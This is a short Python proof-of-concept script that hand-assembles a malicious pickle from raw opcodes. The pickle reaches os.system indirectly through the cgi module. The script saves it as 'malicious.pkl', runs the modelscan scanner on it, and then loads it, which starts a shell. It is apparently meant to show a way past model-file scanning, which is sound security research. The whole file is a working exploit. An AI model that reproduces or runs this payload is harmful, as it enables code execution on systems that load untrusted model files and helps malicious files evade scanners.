from pickle import *

p = b''
p += PROTO + b'\x04'
p += MARK
p += UNICODE + b'sh\n'
p += INST + b'cgi\nos.system\n'
p += STOP

with open('malicious.pkl', 'wb') as f:
    f.write(p)

import os
os.system('modelscan -p malicious.pkl')

from pickle import loads

print(f'{p.hex() = }')
loads(p)

